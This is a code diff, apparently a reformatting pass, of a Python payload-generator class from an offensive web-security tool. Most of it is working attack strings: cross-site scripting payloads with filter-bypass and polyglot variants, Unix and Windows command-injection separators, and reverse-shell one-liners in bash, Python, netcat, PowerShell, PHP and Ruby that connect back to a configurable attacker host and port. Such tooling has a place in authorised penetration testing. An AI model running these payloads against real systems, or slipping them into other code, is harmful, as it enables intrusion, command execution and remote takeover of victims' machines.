@@ -37,30 +37,30 @@ class PayloadGenerator:
 
     XSS_TEMPLATES = {
         "basic": [
-            '<script>alert({marker})</script>',
+            "<script>alert({marker})</script>",
             '"><script>alert({marker})</script>',
             "'-alert({marker})-'",
-            '<img src=x onerror=alert({marker})>',
-            '<svg/onload=alert({marker})>',
+            "<img src=x onerror=alert({marker})>",
+            "<svg/onload=alert({marker})>",
         ],
         "event_handlers": [
-            '<body onload=alert({marker})>',
-            '<input onfocus=alert({marker}) autofocus>',
-            '<marquee onstart=alert({marker})>',
-            '<details open ontoggle=alert({marker})>',
-            '<video src onerror=alert({marker})>',
+            "<body onload=alert({marker})>",
+            "<input onfocus=alert({marker}) autofocus>",
+            "<marquee onstart=alert({marker})>",
+            "<details open ontoggle=alert({marker})>",
+            "<video src onerror=alert({marker})>",
         ],
         "dom_based": [
-            'javascript:alert({marker})',
-            'data:text/html,<script>alert({marker})</script>',
+            "javascript:alert({marker})",
+            "data:text/html,<script>alert({marker})</script>",
             '#"><img src=x onerror=alert({marker})>',
         ],
         "waf_bypass": [
-            '<scr<script>ipt>alert({marker})</scr</script>ipt>',
-            '<<script>alert({marker});//<</script>',
+            "<scr<script>ipt>alert({marker})</scr</script>ipt>",
+            "<<script>alert({marker});//<</script>",
             '<img """><script>alert({marker})</script>">',
-            '<svg><script>alert&#40;{marker}&#41;</script></svg>',
-            '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert({marker})>',
+            "<svg><script>alert&#40;{marker}&#41;</script></svg>",
+            "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert({marker})>",
         ],
         "polyglot": [
             "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert({marker}) )//",
@@ -108,14 +108,24 @@ class PayloadGenerator:
 
     CMDI_TEMPLATES = {
         "unix": [
-            "; {cmd}", "| {cmd}", "& {cmd}", "`{cmd}`",
-            "$({cmd})", "|| {cmd}", "&& {cmd}",
-            "; {cmd} #", "| {cmd} #",
+            "; {cmd}",
+            "| {cmd}",
+            "& {cmd}",
+            "`{cmd}`",
+            "$({cmd})",
+            "|| {cmd}",
+            "&& {cmd}",
+            "; {cmd} #",
+            "| {cmd} #",
             "\n{cmd}",
         ],
         "windows": [
-            "& {cmd}", "| {cmd}", "&& {cmd}",
-            "|| {cmd}", "\n{cmd}", "%0a{cmd}",
+            "& {cmd}",
+            "| {cmd}",
+            "&& {cmd}",
+            "|| {cmd}",
+            "\n{cmd}",
+            "%0a{cmd}",
         ],
     }
 
@@ -125,9 +135,9 @@ class PayloadGenerator:
         "bash_reverse": "bash -i >& /dev/tcp/{host}/{port} 0>&1",
         "python_reverse": (
             "python3 -c 'import socket,subprocess,os;"
-            "s=socket.socket();s.connect((\"{host}\",{port}));"
+            's=socket.socket();s.connect(("{host}",{port}));'
             "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
-            "subprocess.call([\"/bin/sh\",\"-i\"])'"
+            'subprocess.call(["/bin/sh","-i"])\''
         ),
         "nc_reverse": "nc -e /bin/sh {host} {port}",
         "nc_mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f",
@@ -137,14 +147,12 @@ class PayloadGenerator:
             "while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
             "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
             "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
-            "$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}}\""
+            '$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}}"'
         ),
-        "php_reverse": (
-            "php -r '$s=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
-        ),
+        "php_reverse": ('php -r \'$s=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\''),
         "ruby_reverse": (
-            "ruby -rsocket -e'f=TCPSocket.open(\"{host}\",{port}).to_i;"
-            "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+            'ruby -rsocket -e\'f=TCPSocket.open("{host}",{port}).to_i;'
+            'exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
         ),
     }
 
@@ -234,9 +242,7 @@ class PayloadGenerator:
 
     # ─── Generator Methods ───────────────────
 
-    def generate_xss(
-        self, marker: str = "1", category: str = "basic", encode: str | None = None
-    ) -> list[str]:
+    def generate_xss(self, marker: str = "1", category: str = "basic", encode: str | None = None) -> list[str]:
         """Generate XSS payloads."""
         templates = self.XSS_TEMPLATES.get(category, self.XSS_TEMPLATES["basic"])
         payloads = [t.format(marker=marker) for t in templates]
@@ -245,15 +251,16 @@ class PayloadGenerator:
         return payloads
 
     def generate_sqli(
-        self, category: str = "error_based", columns: str = "NULL,NULL,NULL",
-        table: str = "users", char: str = "5", seconds: int = 5,
+        self,
+        category: str = "error_based",
+        columns: str = "NULL,NULL,NULL",
+        table: str = "users",
+        char: str = "5",
+        seconds: int = 5,
     ) -> list[str]:
         """Generate SQL injection payloads."""
         templates = self.SQLI_TEMPLATES.get(category, self.SQLI_TEMPLATES["error_based"])
-        return [
-            t.format(columns=columns, table=table, char=char, seconds=seconds)
-            for t in templates
-        ]
+        return [t.format(columns=columns, table=table, char=char, seconds=seconds) for t in templates]
 
     def generate_cmdi(self, cmd: str = "id", os_type: str = "unix") -> list[str]:
         """Generate command injection payloads."""
@@ -281,31 +288,18 @@ class PayloadGenerator:
     def generate_all(self, config: dict | None = None) -> dict:
         """Generate a comprehensive payload set."""
         with tracer.start_as_current_span("payload_generation"):
-            cfg = config or {}
             result = {
-                "xss": {
-                    cat: self.generate_xss(category=cat)
-                    for cat in self.XSS_TEMPLATES
-                },
-                "sqli": {
-                    cat: self.generate_sqli(category=cat)
-                    for cat in self.SQLI_TEMPLATES
-                },
+                "xss": {cat: self.generate_xss(category=cat) for cat in self.XSS_TEMPLATES},
+                "sqli": {cat: self.generate_sqli(category=cat) for cat in self.SQLI_TEMPLATES},
                 "cmdi": {
                     "unix": self.generate_cmdi(os_type="unix"),
                     "windows": self.generate_cmdi(cmd="whoami", os_type="windows"),
                 },
-                "ssti": {
-                    eng: self.generate_ssti(engine=eng)
-                    for eng in self.SSTI_TEMPLATES
-                },
+                "ssti": {eng: self.generate_ssti(engine=eng) for eng in self.SSTI_TEMPLATES},
                 "ssrf": self.generate_ssrf(),
             }
 
-            total = sum(
-                len(v) if isinstance(v, list) else sum(len(sv) for sv in v.values())
-                for v in result.values()
-            )
+            total = sum(len(v) if isinstance(v, list) else sum(len(sv) for sv in v.values()) for v in result.values())
 
             logger.info("attack.payload.generated", total_payloads=total)
             return {"total_payloads": total, "payloads": result}
